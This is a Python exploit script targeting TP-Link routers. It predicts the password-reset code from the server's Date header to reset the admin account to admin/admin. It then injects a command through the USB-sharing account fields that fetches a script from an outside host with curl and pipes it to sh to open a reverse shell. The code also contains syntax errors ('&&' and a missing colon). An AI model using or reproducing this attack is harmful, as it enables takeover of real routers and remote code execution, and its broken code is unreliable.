#!/usr/bin/env python

import requests
import email.utils as eut
import math
import sys
import utils


class TPLinkPwn:
	def __init__(self, url):
	    self.url = url
	    self.cookies = None
	    self.token = ""
	    self.key = None

	def post(self, path, data):
		return requests.post('%s/cgi-bin/luci/;stok=%s/%s'%(self.url, self.token, path), data=data, cookies=self.cookies)

	def createCode(self):
		data = {
			"operation": "read",
		}
		r = self.post("login?form=vercode", data)
		if r.status_code != 200:
			print "something went wrong"
			print r.status_code
			print r.text
			exit(-1)

	def resetAdmin(self, time):
		code = utils.random(time, 100000, 999999)

		data = {
			"operation": "write",
			"vercode": code
		}

		json = self.post("login?form=vercode", data).json()
		if json["success"] == True:
			print "Found code %d, admin password reset"%code
			return True
		return False

	def guessCode(self, time):
		if self.resetAdmin(time):
			return True
		else:
			for i in range(time, time+5):
				if self.resetAdmin(i):
					return True

		return False

	def getDate(self):
		r = requests.get(self.url)
		if r.status_code != 200:
			print "something went wrong"
			print r.status_code
			print r.text
			exit(-1)
		dateStr = r.headers["Date"]

		return eut.mktime_tz(eut.parsedate_tz(dateStr))

	def setUsbSharing(self):
		print "Making sure the sharing account is the default account"
		data = {
			"operation": "write",
			"account": "admin"
		}
		json = self.post("admin/folder_sharing?form=account", data).json()
		assert json["success"]

	def getRsaKey(self):
		print "Reading RSA key"
		json = self.post("login?form=login", {"operation":"read"}).json()
		assert json["success"]

		n,e = json["data"]["password"]
		self.key = utils.pubKey(n,e)

	def login(self, username, password):
		if not self.key:
			self.getRsaKey()

		data = {
		  "operation": "login",
			"username": username,
			"password": utils.encrypt(self.key, password)
		}
		print "Logging in"
		r = self.post("login?form=login", data)
		json = r.json()
		assert json["success"]

		self.cookies = r.cookies
		self.token = r.json()["data"]["stok"]

	def createAccount(self, username, password):
		assert len(username) < 16 and ' ' not in username
		assert len(password) < 16 and ' ' not in password

		if not self.key:
			self.getRsaKey()

		data = {
		  "operation": "set",
			"new_acc": username,
			"new_pwd": utils.encrypt(self.key, password),
			"cfm_pwd": utils.encrypt(self.key, password)
		}

		print "Creating user account"
		json = self.post("admin/administration?form=account", data).json()
		assert json["success"]

	def reset(self):
		print "Getting current time from Date header"
		time = self.getDate()

		print "Renerating reset code"
		self.createCode()

		print "Finding reset code"
		if not self.guessCode(time):
			print "Code not found"


if __name__ == "__main__":
	if len(sys.argv) < 2:
		print "usage: %s <router base url> [shell url]"%sys.argv[0]
		print "%s http://192.168.0.1 hack.me/s"%sys.argv[0]
		exit(-1)

	if sys.argv[2] && len(sys.argv[2]) > 10:
		print "Shellcode url cannot be greater than 10 characters"
		exit(-1)

	router = sys.argv[1]
	shell = sys.argv[2]
	"""
		Command injection when changing the usb account as it runs the following:
		os.execute("usbuser " .. username .. " '" .. password .. "'")

		username and password are limitted to a length of 16 and no spaces eg 32 < ord(c) < 127
	"""
	tp = TPLinkPwn(router)
	tp.reset()
	print "Admin account reset to admin/admin"

	if shell
		tp.login("admin", "admin")
		tp.setUsbSharing()
		tp.createAccount(";curl", "%s'|sh'"%shell)

		print "Reverse shell activated"